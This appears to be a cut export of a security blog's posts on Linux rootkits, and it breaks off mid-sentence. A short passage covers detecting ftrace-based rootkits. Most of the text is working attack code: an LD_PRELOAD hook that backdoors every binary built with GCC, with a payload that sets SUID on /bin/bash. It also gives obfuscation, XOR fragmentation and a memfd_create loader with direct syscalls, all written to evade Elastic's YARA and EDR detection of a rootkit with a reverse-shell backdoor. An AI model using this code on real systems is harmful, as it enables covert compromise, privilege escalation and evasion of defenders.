integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and 